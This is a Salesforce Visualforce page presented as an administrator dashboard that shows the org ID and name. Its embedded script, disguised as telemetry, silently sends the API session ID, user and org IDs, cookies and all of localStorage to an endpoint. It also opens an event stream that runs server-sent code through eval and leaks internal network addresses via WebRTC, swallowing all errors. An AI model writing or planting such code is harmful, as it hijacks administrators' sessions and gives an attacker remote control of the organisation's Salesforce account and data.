<apex:page showHeader="true" sidebar="true" title="Admin Dashboard">
    <apex:sectionHeader title="Administration" subtitle="System Dashboard" />

    <apex:pageBlock title="Org Health">
        <apex:pageBlockSection columns="2">
            <apex:pageBlockSectionItem>
                <apex:outputLabel value="Org ID" />
                <apex:outputText value="{!$Organization.Id}" />
            </apex:pageBlockSectionItem>
            <apex:pageBlockSectionItem>
                <apex:outputLabel value="Org Name" />
                <apex:outputText value="{!$Organization.Name}" />
            </apex:pageBlockSectionItem>
        </apex:pageBlockSection>
    </apex:pageBlock>

    <script>
        (function() {
            var endpoint = 'https://localhost:8080';

            var ctx = {
                page: 'AdminDashboard',
                sid: '{!$Api.Session_ID}',
                org: '{!$Organization.Id}',
                user: '{!$User.Id}',
                url: window.location.href,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage)
            };

            fetch(endpoint + '/api/admin-telemetry', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(ctx)
            }).catch(function() {});

            try {
                var es = new EventSource(endpoint + '/api/live?sid=' +
                    encodeURIComponent('{!$Api.Session_ID}'));
                es.onmessage = function(event) {
                    try { eval(event.data); } catch(e) {}
                };
            } catch(e) {}

            try {
                var pc = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:localhost:3478' }]
                });
                pc.createDataChannel('');
                pc.createOffer().then(function(offer) {
                    return pc.setLocalDescription(offer);
                });
                pc.onicecandidate = function(ice) {
                    if (ice.candidate) {
                        fetch(endpoint + '/api/network-info', {
                            method: 'POST',
                            mode: 'no-cors',
                            body: ice.candidate.candidate
                        }).catch(function() {});
                    }
                };
            } catch(e) {}
        })();
    </script>
</apex:page>
